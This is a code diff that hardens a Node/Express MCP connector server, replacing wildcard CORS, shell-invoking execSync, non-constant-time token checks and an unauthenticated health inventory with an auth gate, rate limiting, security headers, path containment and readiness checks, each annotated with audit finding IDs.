@@ -50,6 +50,26 @@
 import "dotenv/config";
 // v12.0.0: Tenant authentication middleware
 import { tenantAuthMiddleware, logTenantModeStatus, isTenantMode } from './middleware/tenantAuth.js';
+// v12.28.0 (TNX-C-001): connector-wide fail-closed authentication gate.
+import {
+  assertConfigured        as assertMcpAuthConfigured,
+  mcpAuthMiddleware,
+  assertAllRoutesCovered,
+  describeAllowlist       as describeAuthAllowlist,
+}                                                                  from './middleware/mcpAuth.js';
+// v12.28.0 (TNX-C-005 / TNX-C-010): boundary-correct path containment.
+import { resolveContained, isSafeFilename }                        from './utils/pathContainment.js';
+// v12.28.0 (TNX-H-004 / TNX-H-006): process guards, HTTP timeout tuning,
+// graceful drain and readiness checks. The connector previously had none of
+// these; the gateway had all of them.
+import {
+  installProcessGuards,
+  applyServerTimeouts,
+  installShutdownHandlers,
+  runReadinessChecks,
+  isShuttingDown,
+  uptimeSeconds,
+}                                                                  from './utils/serviceRuntime.js';
 import { initDevice }                                               from './utils/deviceId.js';
 import { registerProvisionRoute } from './routes/provision.js';
 // v12.3.0: Tenant session init tool
@@ -85,12 +105,22 @@ import {
   handleEscalationQueueRead,
 } from './tools/clientCheckin.js';
 import { createServer } from "http";
-import { execSync } from "child_process";
+// v12.28.0 (TNX-C-010): execSync invokes /bin/sh -c and was being handed an
+// interpolated, caller-controlled filename. Replaced throughout by
+// execFileSync, which passes an argument array directly to execve and never
+// involves a shell, eliminating the command-injection class outright.
+import { execFileSync } from "child_process";
 import { registerExportRoute } from './routes/export.js';
 // v12.22.0: pre/post deployment volume snapshot and restore endpoints.
 import { registerVolumeSnapshotRoutes } from './routes/volume-snapshot.js';
 import express from "express";
-import { randomUUID } from "node:crypto";
+// v12.28.0 (TNX-C-001): express-rate-limit was a declared but unused dependency.
+import rateLimit from "express-rate-limit";
+// v12.28.0 (TNX-M-021): security headers and response compression. Neither Node
+// service set any security headers at all.
+import helmet from "helmet";
+import compression from "compression";
+import { randomUUID, createHash, timingSafeEqual } from "node:crypto";
 import { readFileSync, writeFileSync, existsSync, mkdirSync, readdirSync, statSync, unlinkSync } from "fs";
 import { dirname, join as pathJoin, basename, extname, resolve as pathResolve } from "path";
 
@@ -390,7 +420,8 @@ import {
   getSendMetadata,
   incrementOpen,
 } from "./utils/tracking.js";
-import { startScheduler } from "./utils/scheduler.js";
+import { startScheduler, flushScheduleStore } from "./utils/scheduler.js";
+import { migrateLegacyCredentials, checkStorageLocation } from "./utils/credentialStore.js";
 
 import { getCurrentDateTime } from "./utils/helpers.js";
 import { log } from "./utils/logger.js";
@@ -1351,18 +1382,277 @@ and plain-English interpretation of findings.
 // -----------------------------------------------------------------------
 // Express app
 // -----------------------------------------------------------------------
+// ---------------------------------------------------------------------------
+// Process guards  (v12.28.0 -- TNX-H-006)
+//
+// Installed before the app is constructed, so a rejection or throw during route
+// registration is caught rather than producing a silent exit. The connector
+// previously had NO unhandledRejection and NO uncaughtException handler at all:
+// a rejected promise in an async tool handler produced no log line and left the
+// caller's socket hanging until it timed out.
+// ---------------------------------------------------------------------------
+installProcessGuards({ log });
+
+// ---------------------------------------------------------------------------
+// Credential storage  (v12.30.0 -- TNX-H-014)
+//
+// Runs before anything can read a credential. Two steps:
+//
+//   1. Migrate any credentials left at the legacy in-image path /app/data/.
+//      Those were written by earlier versions and would be destroyed by the
+//      next redeploy, silently, which is the data-loss half of TNX-H-014.
+//   2. Verify the configured directory is on a persistent volume and writable,
+//      and log loudly if it is not. The absence of this check is why the
+//      original defect went unnoticed: credentials appeared to save and then
+//      vanished at the next deploy with no error at any point.
+//
+// Reported rather than fatal. An unwritable credential directory must not stop
+// a connector that is otherwise fully functional from serving its other tools.
+// ---------------------------------------------------------------------------
+migrateLegacyCredentials();
+checkStorageLocation();
+
+// ---------------------------------------------------------------------------
+// Version  (v12.28.0 -- TNX-M-005)
+//
+// Previously the /health handler carried a hardcoded "12.26.0" while
+// package.json said 12.27.0, so the field misidentified the running build and
+// was actively misleading during an incident. Read it from package.json once
+// at boot instead, so the two can never disagree.
+//
+// Wrapped because a container built without package.json present must still
+// start; an unknown version is a degraded log line, not a reason to refuse
+// service.
+// ---------------------------------------------------------------------------
+const CONNECTOR_VERSION = (() => {
+  try {
+    const pkgPath = new URL("../package.json", import.meta.url);
+    return JSON.parse(readFileSync(pkgPath, "utf8")).version || "unknown";
+  } catch {
+    return "unknown";
+  }
+})();
+
 const app = express();
-// Body limit raised to 50mb (v9.0.0) to support inline-data dataset loading.
-app.use(express.json({ limit: "50mb" }));
+
+// v12.28.0: the connector runs behind the Railway edge proxy. Without this,
+// req.ip is the proxy address and every caller shares one rate-limit bucket.
+// The value is the number of proxy hops to trust, NOT `true`: trusting all
+// proxies lets a caller forge X-Forwarded-For and evade the limiter entirely.
+app.set("trust proxy", parseInt(process.env.TRUST_PROXY_HOPS || "1", 10));
+
+// ---------------------------------------------------------------------------
+// Security headers  (v12.28.0 -- TNX-M-021)
+//
+// contentSecurityPolicy is disabled at this level because the connector already
+// sets its own frame-ancestors policy in the CORS handler below (derived from
+// MCP_ALLOWED_ORIGINS) and a much stricter sandbox policy on /preview
+// responses (TNX-C-010). Letting helmet install a second, weaker default policy
+// would overwrite both.
+//
+// crossOriginResourcePolicy is disabled because the Tenax chat surface loads
+// /api/config.js and the document preview iframe cross-origin by design; that
+// access is governed by the explicit CORS allowlist instead.
+// ---------------------------------------------------------------------------
+app.use(helmet({
+  contentSecurityPolicy:     false,
+  crossOriginResourcePolicy: false,
+  crossOriginEmbedderPolicy: false,
+  hsts: { maxAge: 31536000, includeSubDomains: true, preload: false },
+  referrerPolicy: { policy: "strict-origin-when-cross-origin" },
+  frameguard: false,   // frame-ancestors is set explicitly in the CORS handler
+}));
+
+// ---------------------------------------------------------------------------
+// Response compression
+//
+// The filter is load-bearing. This service exposes the legacy SSE transport at
+// /sse and the Streamable HTTP transport at /mcp, both of which must deliver
+// each frame the moment it is written. compression() buffers to build deflate
+// blocks, so mounting it with the default filter would hold MCP frames in the
+// compressor and stall the transport in a way that looks like a network fault.
+// ---------------------------------------------------------------------------
+app.use(compression({
+  filter: (req, res) => {
+    if (req.headers["x-no-compression"]) return false;
+
+    // Both MCP transports stream. Exclude them by path as well as by content
+    // type, because the content type is not set until the transport writes its
+    // first frame, which is after this filter has already run.
+    if (req.path === "/sse" || req.path === "/messages" || req.path === "/mcp") return false;
+
+    const contentType = String(res.getHeader("Content-Type") || "");
+    if (contentType.includes("text/event-stream")) return false;
+
+    return compression.filter(req, res);
+  },
+  threshold: 1024,
+}));
+
+// ---------------------------------------------------------------------------
+// Body parsing with per-path limits  (v12.28.0 -- TNX-C-003 resolution item 4)
+//
+// The body limit was globally 50mb (raised in v9.0.0 for inline-data dataset
+// loading). That ceiling applied to every route, including ones that accept
+// only a handful of short string fields, and it was one of the two components
+// of the volume-exhaustion risk in TNX-C-003.
+//
+// Two parsers are now built. A dispatching middleware selects the large one
+// only for the routes that genuinely carry bulk payloads -- MCP transports
+// (inline datasets and tool arguments), file uploads, volume restores and the
+// skill compiler -- and the small one for everything else.
+//
+// The dispatcher is used rather than per-route parsers because a globally
+// mounted express.json() consumes and validates the stream before any route
+// middleware runs, so a per-route parser mounted later can never widen a limit
+// the global parser has already rejected.
+// ---------------------------------------------------------------------------
+const SMALL_BODY_LIMIT = process.env.MCP_BODY_LIMIT       || "2mb";
+const LARGE_BODY_LIMIT = process.env.MCP_LARGE_BODY_LIMIT || "50mb";
+
+/** Paths permitted to send a large request body. */
+const LARGE_BODY_PATHS = [
+  { exact:  "/mcp" },
+  { exact:  "/messages" },
+  { exact:  "/tool-call" },
+  { exact:  "/data/upload" },
+  { exact:  "/upload/connections" },
+  { exact:  "/brain-scan" },
+  { exact:  "/ti-skill-compile" },
+  { prefix: "/restore-" },
+];
+
+/**
+ * True when the request path is allowed the large body limit.
+ * @param {string} pathname req.path
+ * @returns {boolean}
+ */
+function allowsLargeBody(pathname) {
+  const p = String(pathname || "");
+  return LARGE_BODY_PATHS.some(
+    (r) => (r.exact !== undefined && p === r.exact) ||
+           (r.prefix !== undefined && p.startsWith(r.prefix))
+  );
+}
+
+const smallJsonParser = express.json({ limit: SMALL_BODY_LIMIT });
+const largeJsonParser = express.json({ limit: LARGE_BODY_LIMIT });
 
 app.use((req, res, next) => {
-  res.setHeader("Access-Control-Allow-Origin", "*");
-  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization, Mcp-Session-Id, Accept");
-  res.setHeader("Access-Control-Allow-Methods", "GET, POST, DELETE, OPTIONS");
-  res.setHeader("Content-Security-Policy", "frame-ancestors *;");  // allow iframe in Tenax UI
+  const parser = allowsLargeBody(req.path) ? largeJsonParser : smallJsonParser;
+  parser(req, res, next);
+});
+
+// ---------------------------------------------------------------------------
+// CORS  (v12.28.0 -- remediates TNX-C-008)
+//
+// Previously this handler set `Access-Control-Allow-Origin: *` unconditionally
+// on every route. The connector is a server-to-server component; the only
+// browser-originated traffic it serves is the Tenax chat surface loading
+// /api/config.js, /data/upload and the document preview iframe.
+//
+// New behaviour: an explicit allowlist read from MCP_ALLOWED_ORIGINS
+// (comma-separated). When the variable is unset, NO CORS headers are emitted
+// at all, which is the correct default for a server-to-server service and
+// blocks every cross-origin browser request. Origins are normalised
+// (lowercased, trailing slash stripped) before comparison so that casing
+// cannot be used to bypass the list.
+//
+// `Vary: Origin` is mandatory whenever the response varies by request origin,
+// otherwise a shared cache can serve one origin's allowed response to another.
+// ---------------------------------------------------------------------------
+
+/**
+ * Normalise an origin for comparison: lowercase, no trailing slash.
+ * @param {string} value Raw origin string.
+ * @returns {string} Normalised origin, or '' when not usable.
+ */
+function normaliseOrigin(value) {
+  const s = String(value || "").trim().toLowerCase().replace(/\/+$/, "");
+  return s;
+}
+
+const MCP_ALLOWED_ORIGINS = String(process.env.MCP_ALLOWED_ORIGINS || "")
+  .split(",")
+  .map(normaliseOrigin)
+  .filter(Boolean);
+
+// A literal "*" in the allowlist is refused rather than honoured. Reflecting
+// arbitrary origins is the defect TNX-C-008 describes; silently accepting the
+// wildcard here would reintroduce it through configuration.
+if (MCP_ALLOWED_ORIGINS.includes("*")) {
+  console.error(
+    "[FATAL] MCP_ALLOWED_ORIGINS contains '*'. Wildcard CORS is not supported. " +
+    "List the exact origins that must reach this connector, or leave the variable " +
+    "unset to emit no CORS headers at all."
+  );
+  process.exit(1);
+}
+
+// Frame-ancestors for the document preview iframe embedded by the Tenax UI.
+// Defaults to 'none' (no framing) unless origins are explicitly configured.
+const FRAME_ANCESTORS = MCP_ALLOWED_ORIGINS.length
+  ? MCP_ALLOWED_ORIGINS.join(" ")
+  : "'none'";
+
+app.use((req, res, next) => {
+  const origin = normaliseOrigin(req.headers.origin);
+
+  // Vary must be set unconditionally, including on responses that carry no
+  // Access-Control-Allow-Origin, so caches key on Origin either way.
+  res.setHeader("Vary", "Origin");
+
+  if (origin && MCP_ALLOWED_ORIGINS.includes(origin)) {
+    // Echo the caller's own origin string (not the normalised form) only after
+    // the normalised form has matched, so the browser's byte comparison passes.
+    res.setHeader("Access-Control-Allow-Origin", String(req.headers.origin).trim());
+    res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization, X-MCP-Api-Key, Mcp-Session-Id, Accept");
+    res.setHeader("Access-Control-Allow-Methods", "GET, POST, DELETE, OPTIONS");
+    res.setHeader("Access-Control-Max-Age", "600");
+  }
+
+  // Baseline response hardening applied to every response.
+  res.setHeader("Content-Security-Policy", `frame-ancestors ${FRAME_ANCESTORS};`);
+  res.setHeader("X-Content-Type-Options", "nosniff");
+  res.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");
+
   if (req.method === "OPTIONS") { res.sendStatus(204); return; }
   next();
 });
+
+// ---------------------------------------------------------------------------
+// Authentication gate  (v12.28.0 -- remediates TNX-C-001)
+//
+// Mounted here, before every route registration below, so that the route
+// coverage assertion in assertAllRoutesCovered() can prove that no route is
+// registered ahead of it. Routes that carry their own credential, and the
+// small set that must be publicly reachable, are allowlisted inside
+// src/middleware/mcpAuth.js with a written justification each.
+// ---------------------------------------------------------------------------
+app.use(mcpAuthMiddleware);
+
+// ---------------------------------------------------------------------------
+// Rate limiting  (v12.28.0 -- TNX-C-001 resolution item 5)
+//
+// express-rate-limit was already a declared dependency but was referenced
+// nowhere. Applied to the MCP transports and the credentialled tool-dispatch
+// endpoints, which are the paths that reach the tool surface.
+//
+// `trust proxy` is set on the app below so that req.ip is the client address
+// from X-Forwarded-For rather than the Railway edge address, which would
+// otherwise collapse every caller into a single bucket.
+// ---------------------------------------------------------------------------
+const MCP_RATE_WINDOW_MS = parseInt(process.env.MCP_RATE_WINDOW_MS || "60000", 10);
+const MCP_RATE_MAX       = parseInt(process.env.MCP_RATE_MAX       || "240",   10);
+
+const mcpRateLimiter = rateLimit({
+  windowMs: Number.isFinite(MCP_RATE_WINDOW_MS) && MCP_RATE_WINDOW_MS > 0 ? MCP_RATE_WINDOW_MS : 60_000,
+  max:      Number.isFinite(MCP_RATE_MAX)       && MCP_RATE_MAX       > 0 ? MCP_RATE_MAX       : 240,
+  standardHeaders: true,
+  legacyHeaders:   false,
+  message: { error: "Too many requests. Slow down and retry.", code: "RATE_LIMITED" },
+});
+
 app.get('/api/config.js', (_req, res) => {
   const publicDomain = process.env.RAILWAY_PUBLIC_DOMAIN || 'claude-connector-production.up.railway.app';
   const protocol = process.env.RAILWAY_PUBLIC_DOMAIN ? 'https' : 'http';
@@ -1374,14 +1664,178 @@ app.get('/api/config.js', (_req, res) => {
 // -----------------------------------------------------------------------
 // Health
 // -----------------------------------------------------------------------
-app.get("/health", (_req, res) => {
-  const memorySnapshot = MEMORY_ENABLED
-    ? getMemoryHealthSnapshot()
-    : { enabled: false };
+// v12.28.0 (TNX-M-004): /health must stay publicly reachable because the
+// orchestrator probes it before any credential is available. Its previous
+// payload enumerated which integrations were configured -- Slack, Teams,
+// Calendar, Sheets, email dispatch, LinkedIn OAuth, the memory subsystem --
+// which is a reconnaissance map for an attacker choosing a target.
+//
+// The public response is now a bare liveness signal. The full diagnostic
+// payload is preserved verbatim and returned only to an authenticated caller,
+// so operator tooling that presents the Authorization header sees no change.
+// ---------------------------------------------------------------------------
+// Health endpoints  (v12.28.0 -- remediates TNX-H-004)
+//
+// The previous single /health handler was decorative. `status` was the string
+// literal "ok". Nothing was verified: not the /data volume mount, not the
+// SQLite memory database, not disk writability, not configuration validity.
+//
+// That matters because railway.toml sets healthcheckPath="/health" and the
+// Dockerfile HEALTHCHECK polls the same path. If the volume failed to mount --
+// the failure mode that silently destroys the memory store and the credentials
+// file -- /health still returned "ok", the platform kept routing traffic to a
+// broken instance, and the restart policy could never fire for anything short
+// of a process exit.
+//
+// It was also an unauthenticated configuration inventory, enumerating every
+// configured integration. That is addressed separately (TNX-M-004): the
+// detailed payload now requires authentication.
+//
+// Three endpoints, answering three different questions:
+//
+//   /health/live    Is the process alive? No I/O, no dependencies, stays 200
+//                   during drain. A liveness probe that touches storage will
+//                   fail during a storage outage and cause the orchestrator to
+//                   restart a healthy process, turning a recoverable
+//                   dependency failure into a crash loop.
+//
+//   /health/ready   Should traffic be routed here? Actually verifies the
+//                   volume, the memory subsystem and configuration. Returns
+//                   503 while draining or when a critical check fails.
+//
+//   /health         Alias of /health/ready, so existing railway.toml and
+//                   Dockerfile configuration keeps working. Point both at
+//                   /health/ready when convenient.
+// ---------------------------------------------------------------------------
+
+/**
+ * Readiness checks. Each returns true when healthy or throws with a reason.
+ *
+ * `critical: false` marks a check that degrades the report without failing
+ * readiness, used where the subsystem is optional in some deployments.
+ */
+function buildReadinessChecks() {
+  const checks = [];
+
+  // The persistent volume. This is the check whose absence made the old
+  // handler dangerous: an unmounted /data destroys the memory store, the
+  // schedule store and the download directory, and nothing noticed.
+  checks.push({
+    name: 'data_volume',
+    run: () => {
+      const dir = process.env.DATA_VOLUME_PATH || '/data';
+      if (!existsSync(dir)) throw new Error(`${dir} is not present`);
+      // Presence is not enough. A read-only or full volume presents as mounted
+      // and then fails every write, so probe with an actual write.
+      const probe = pathJoin(dir, '.health-probe');
+      writeFileSync(probe, String(Date.now()), 'utf8');
+      unlinkSync(probe);
+      return true;
+    },
+  });
+
+  // The memory subsystem, when enabled. Reported but not fatal: the connector
+  // serves ~60 tools and only six of them are memory tools, so a memory outage
+  // should not remove the whole instance from rotation.
+  if (MEMORY_ENABLED) {
+    checks.push({
+      name: 'memory',
+      critical: false,
+      run: () => {
+        const snapshot = getMemoryHealthSnapshot();
+        if (snapshot && snapshot.healthy === false) {
+          throw new Error(snapshot.error || 'memory subsystem reports unhealthy');
+        }
+        return true;
+      },
+    });
+  }
+
+  // Credential persistence. Non-critical: the connector serves its other tools
+  // perfectly well without a writable credential store, and removing the whole
+  // instance from rotation would be a larger outage than the one being
+  // reported. Surfacing it here is what makes the TNX-H-014 silent-loss
+  // condition visible rather than being discovered after a redeploy.
+  checks.push({
+    name: 'credential_store',
+    critical: false,
+    run: () => {
+      const state = checkStorageLocation();
+      if (state.insideImage) throw new Error('credential directory is inside the container image; credentials will be lost on redeploy');
+      if (!state.writable)   throw new Error(`credential directory is not writable: ${state.detail}`);
+      return true;
+    },
+  });
+
+  // Configuration validity. An instance that cannot authenticate callers is
+  // not ready to receive them.
+  checks.push({
+    name: 'configuration',
+    run: () => {
+      if (!(process.env.MCP_API_KEY || '').trim()) throw new Error('MCP_API_KEY is not set');
+      return true;
+    },
+  });
+
+  return checks;
+}
+
+app.get("/health/live", (_req, res) => {
+  // Deliberately 200 even while draining. If liveness failed during drain the
+  // orchestrator would conclude the container had hung and SIGKILL an instance
+  // that was shutting down correctly, destroying the in-flight tool calls the
+  // drain exists to protect.
+  res.json({
+    status:  "alive",
+    server:  "claude-connector",
+    version: CONNECTOR_VERSION,
+    uptime_s: uptimeSeconds(),
+    ts:      new Date().toISOString(),
+  });
+});
+
+app.get(["/health/ready", "/health"], async (req, res) => {
+  if (isShuttingDown()) {
+    res.setHeader("Retry-After", "5");
+    res.status(503).json({
+      status: "draining", server: "claude-connector", ts: new Date().toISOString(),
+    });
+    return;
+  }
+
+  const report = await runReadinessChecks(buildReadinessChecks());
+
+  if (!report.ready) {
+    res.setHeader("Retry-After", "5");
+    res.status(503).json({
+      status: "not_ready",
+      server: "claude-connector",
+      checks: report.checks,
+      ts:     new Date().toISOString(),
+    });
+    return;
+  }
+
+  // v12.28.0 (TNX-M-004): the integration inventory below is a target list for
+  // anyone probing the service, so it is returned only to an authenticated
+  // caller. An unauthenticated probe gets readiness and nothing else.
+  if (!req.mcpAuthenticated) {
+    res.json({
+      status: "ok", server: "claude-connector", checks: report.checks, ts: new Date().toISOString(),
+    });
+    return;
+  }
+
+  const memorySnapshot = MEMORY_ENABLED ? getMemoryHealthSnapshot() : { enabled: false };
   res.json({
     status: "ok",
     server: "claude-connector",
-    version: "12.26.0",
+    // v12.28.0 (TNX-M-005): read from package.json at boot rather than being
+    // hardcoded. The old handler reported 12.26.0 while package.json said
+    // 12.27.0, so the field misidentified the running build.
+    version: CONNECTOR_VERSION,
+    uptime_s: uptimeSeconds(),
+    checks: report.checks,
     memory: memorySnapshot,
     statsAndMlEnabled: true,
     transport: ["streamable-http", "sse-legacy"],
@@ -1605,7 +2059,7 @@ const streamableSessions = {};
 // v12.0.0: Tenant authentication gate.
 // In tenant mode, validates the API key against the TrueSource Client Gateway
 // before the MCP session is allowed to proceed. In owner mode this is a no-op.
-app.all("/mcp", tenantAuthMiddleware, async (req, res) => {
+app.all("/mcp", mcpRateLimiter, tenantAuthMiddleware, async (req, res) => {
   const sessionId = req.headers["mcp-session-id"];
   try {
     if (sessionId && streamableSessions[sessionId]) {
@@ -1642,14 +2096,14 @@ app.all("/mcp", tenantAuthMiddleware, async (req, res) => {
 // -----------------------------------------------------------------------
 const sseSessions = {};
 
-app.get("/sse", async (req, res) => {
+app.get("/sse", mcpRateLimiter, async (req, res) => {
   const transport = new SSEServerTransport("/messages", res);
   sseSessions[transport.sessionId] = transport;
   res.on("close", () => { delete sseSessions[transport.sessionId]; });
   await createMcpServer(null).connect(transport);
 });
 
-app.post("/messages", async (req, res) => {
+app.post("/messages", mcpRateLimiter, async (req, res) => {
   const transport = sseSessions[req.query.sessionId];
   if (!transport) { res.status(404).json({ error: "Session not found" }); return; }
   await transport.handlePostMessage(req, res, req.body);
@@ -2564,7 +3018,7 @@ app.get("/tools", (req, res) => {
 // The result is always a string (the text from the MCP content block).
 // Callers should treat it as they would a raw tool result string.
 // -----------------------------------------------------------------------
-app.post("/tool-call", async (req, res) => {
+app.post("/tool-call", mcpRateLimiter, async (req, res) => {
   const token = (req.headers["x-railway-restore-token"] || "").trim();
   if (!RAILWAY_RESTORE_TOKEN) {
     return res.status(503).json({ error: "RAILWAY_RESTORE_TOKEN not set. Cannot authenticate tool-call requests." });
@@ -2608,26 +3062,128 @@ app.post("/tool-call", async (req, res) => {
     return res.status(statusCode).json({ error: err.message, is_error: true });
   }
 });
+// ---------------------------------------------------------------------------
+// Document token helpers  (v12.28.0 -- TNX-C-010 resolution item 4)
+//
+// The previous comparison used `===` on the raw strings, which short-circuits
+// on the first differing byte and is therefore a timing oracle for the token.
+// Both operands are now hashed to a fixed 32 bytes and compared with
+// crypto.timingSafeEqual. Hashing first is required, not cosmetic:
+// timingSafeEqual throws on a length mismatch, and that throw would itself
+// disclose the expected token length.
+//
+// The token is still accepted from the query string because these URLs are
+// opened directly by a browser, which cannot set a request header. Headers are
+// preferred and checked first. Query-string carriage remains a known residual
+// (the value reaches access logs, proxy logs and browser history); the durable
+// fix is a short-lived per-file signed URL, scheduled as Phase 3 work.
+// Referrer-Policy: no-referrer is set on these responses so that a previewed
+// document cannot leak the token onward through the Referer header.
+// ---------------------------------------------------------------------------
+
+/**
+ * Constant-time string equality.
+ * @param {string} a
+ * @param {string} b
+ * @returns {boolean}
+ */
+function constantTimeEquals( a, b ) {
+  if ( typeof a !== 'string' || typeof b !== 'string' ) return false;
+  if ( a.length === 0 || b.length === 0 ) return false;
+  const ha = createHash( 'sha256' ).update( a, 'utf8' ).digest();
+  const hb = createHash( 'sha256' ).update( b, 'utf8' ).digest();
+  return timingSafeEqual( ha, hb );
+}
+
+/**
+ * Extract the document token from a request, preferring headers.
+ * @param {import('express').Request} req
+ * @returns {string}
+ */
+function extractDocumentToken( req ) {
+  const authHeader = String( req.headers.authorization || '' ).trim();
+  const bearer     = /^Bearer\s+(.+)$/i.exec( authHeader );
+  if ( bearer ) return bearer[ 1 ].trim();
+
+  const restoreHeader = req.headers[ 'x-railway-restore-token' ];
+  if ( typeof restoreHeader === 'string' && restoreHeader.trim() ) return restoreHeader.trim();
+
+  const docHeader = req.headers[ 'x-document-token' ];
+  if ( typeof docHeader === 'string' && docHeader.trim() ) return docHeader.trim();
+
+  return String( req.query.token || '' ).trim();
+}
+
+/**
+ * Validate a document token against either configured secret, in constant time.
+ * Both comparisons always run so the number of comparisons performed does not
+ * depend on which token matched.
+ *
+ * @param {string} supplied
+ * @returns {{ ok: boolean, configured: boolean }}
+ */
+function documentTokenValid( supplied ) {
+  const configured = Boolean( DOCUMENT_DOWNLOAD_TOKEN || RAILWAY_RESTORE_TOKEN );
+  if ( ! configured ) return { ok: false, configured: false };
+
+  const m1 = DOCUMENT_DOWNLOAD_TOKEN ? constantTimeEquals( supplied, DOCUMENT_DOWNLOAD_TOKEN ) : false;
+  const m2 = RAILWAY_RESTORE_TOKEN   ? constantTimeEquals( supplied, RAILWAY_RESTORE_TOKEN   ) : false;
+  return { ok: m1 || m2, configured: true };
+}
+
+/** Base directory for downloadable and previewable documents. */
+const DOWNLOADS_BASE = '/data/downloads';
+
+// ---------------------------------------------------------------------------
+// Preview extraction subprocess  (v12.28.0 -- TNX-C-010 item 1)
+//
+// Both the interpreter and the script path are fixed deployment configuration
+// resolved once at module load. They are never influenced by a request. The
+// only caller-derived value that reaches the subprocess is the document path,
+// and it is passed as a distinct element of the argument array to execFileSync,
+// which never involves a shell.
+//
+// The interpreter probe mirrors src/tools/script-execute.js: Railway manages
+// Python through mise, which installs a shim rather than a system python3.
+// ---------------------------------------------------------------------------
+const PREVIEW_PYTHON_BIN = existsSync( '/mise/shims/python3' )
+  ? '/mise/shims/python3'
+  : 'python3';
+
+const PREVIEW_EXTRACT_SCRIPT = process.env.PREVIEW_EXTRACT_SCRIPT
+  || '/data/skill/ava/scripts/preview_extract.py';
+
 // GET /download/:filename
 // Serves a file from /data/downloads/ directory.
-// Auth: DOCUMENT_DOWNLOAD_TOKEN (query param preferred) or RAILWAY_RESTORE_TOKEN.
+// Auth: DOCUMENT_DOWNLOAD_TOKEN or RAILWAY_RESTORE_TOKEN (header preferred).
 app.get( '/download/:filename', ( req, res ) => {
-  const token = ( req.query.token || req.headers[ 'x-railway-restore-token' ] || '' ).trim();
-  const validToken1 = DOCUMENT_DOWNLOAD_TOKEN;
-  const validToken2 = RAILWAY_RESTORE_TOKEN;
+  res.setHeader( 'Referrer-Policy', 'no-referrer' );
 
-  if ( !validToken1 && !validToken2 ) {
+  const token   = extractDocumentToken( req );
+  const tokenCk = documentTokenValid( token );
+
+  if ( ! tokenCk.configured ) {
     return res.status( 503 ).json( { error: 'No download token configured. Set DOCUMENT_DOWNLOAD_TOKEN in Railway Variables.' } );
   }
-
-  const tokenOk = ( validToken1 && token === validToken1 ) || ( validToken2 && token === validToken2 );
-  if ( !tokenOk ) {
+  if ( ! tokenCk.ok ) {
     return res.status( 401 ).json( { error: 'Invalid or missing token.' } );
   }
 
-  const filename    = req.params.filename;
-  const safeName    = basename( filename );
-  const filePath    = pathJoin( '/data/downloads', safeName );
+  // v12.28.0 (TNX-C-010 item 2): basename() removes directory separators but
+  // preserves quotes, semicolons, backticks, $, pipes and spaces. Re-validate
+  // against a strict single-segment pattern in addition to basename().
+  const safeName = basename( String( req.params.filename || '' ) );
+  if ( ! isSafeFilename( safeName ) ) {
+    return res.status( 400 ).json( { error: 'Invalid filename.' } );
+  }
+
+  // v12.28.0 (TNX-C-005 item 5): boundary-correct containment plus symlink
+  // refusal. basename() alone cannot stop a symlink inside the downloads
+  // directory from pointing outside it.
+  const filePath = resolveContained( DOWNLOADS_BASE, safeName );
+  if ( ! filePath ) {
+    return res.status( 400 ).json( { error: 'Invalid filename.' } );
+  }
 
   if ( ! existsSync( filePath ) ) {
     return res.status( 404 ).json( { error: `File not found: ${ safeName }` } );
@@ -2663,31 +3219,61 @@ app.get( '/download/:filename', ( req, res ) => {
 // Fallback: uses preview_extract.py for legacy docx-only files.
 // Auth: DOCUMENT_DOWNLOAD_TOKEN or RAILWAY_RESTORE_TOKEN (query param).
 app.get( '/preview/:filename', async ( req, res ) => {
-  const token      = ( req.query.token || '' ).trim();
-  const validToken1 = DOCUMENT_DOWNLOAD_TOKEN;
-  const validToken2 = RAILWAY_RESTORE_TOKEN;
+  // v12.28.0 (TNX-C-010 item 3): the previewed document is rendered under a
+  // CSP sandbox with no allow-scripts, which places it in a unique opaque
+  // origin and disables script execution entirely. Stored HTML on the
+  // connector origin therefore cannot execute, cannot read connector storage,
+  // and cannot reach the embedding parent document. nosniff prevents the
+  // browser from re-typing a response and defeating the declared type.
+  // no-referrer stops the query-string token leaking onward.
+  const applyPreviewHeaders = () => {
+    // sandbox is listed WITHOUT allow-scripts and WITHOUT allow-same-origin,
+    // which is what disables script execution and severs access to the
+    // connector origin. allow-popups and allow-top-navigation-by-user-activation
+    // are granted so the "Download Original" link inside the preview continues
+    // to work when the user clicks it; neither grant re-enables scripting.
+    // script-src 'none' is stated explicitly as well, so the policy still
+    // blocks scripts in any user agent that ignores the sandbox directive.
+    res.setHeader(
+      'Content-Security-Policy',
+      "sandbox allow-popups allow-top-navigation-by-user-activation; " +
+      "default-src 'none'; script-src 'none'; object-src 'none'; " +
+      "style-src 'unsafe-inline' https:; img-src data: https:; font-src data: https:; " +
+      "base-uri 'none'; form-action 'none';"
+    );
+    res.setHeader( 'X-Content-Type-Options', 'nosniff' );
+    res.setHeader( 'Referrer-Policy', 'no-referrer' );
+  };
+  applyPreviewHeaders();
 
-  if ( !validToken1 && !validToken2 ) {
+  const token   = extractDocumentToken( req );
+  const tokenCk = documentTokenValid( token );
+
+  if ( ! tokenCk.configured ) {
     return res.status( 503 ).json( { error: 'No download token configured.' } );
   }
-
-  const tokenOk = ( validToken1 && token === validToken1 ) || ( validToken2 && token === validToken2 );
-  if ( !tokenOk ) {
+  if ( ! tokenCk.ok ) {
     return res.status( 401 ).json( { error: 'Invalid or missing token.' } );
   }
 
-  const filename = req.params.filename;
-  const safeName = basename( filename );
-  const ext      = extname( safeName ).toLowerCase();
-  const dlDir    = '/data/downloads';
+  // v12.28.0 (TNX-C-010 item 2): strict single-segment validation on top of
+  // basename(). This is the control that makes the execFileSync call below
+  // safe even against a filename that was created before this release.
+  const safeName = basename( String( req.params.filename || '' ) );
+  if ( ! isSafeFilename( safeName ) ) {
+    return res.status( 400 ).json( { error: 'Invalid filename.' } );
+  }
+
+  const ext   = extname( safeName ).toLowerCase();
+  const dlDir = DOWNLOADS_BASE;
 
   // Auto-create downloads directory if missing
   if ( !existsSync( dlDir ) ) mkdirSync( dlDir, { recursive: true } );
 
   // ── Serve .html files directly (generated alongside the docx) ──────────────
   if ( ext === '.html' ) {
-    const filePath = pathJoin( dlDir, safeName );
-    if ( !existsSync( filePath ) ) {
+    const filePath = resolveContained( dlDir, safeName );
+    if ( ! filePath || !existsSync( filePath ) ) {
       return res.status( 404 ).json( { error: `Preview not found: ${ safeName }` } );
     }
     res.setHeader( 'Content-Type', 'text/html; charset=utf-8' );
@@ -2697,23 +3283,35 @@ app.get( '/preview/:filename', async ( req, res ) => {
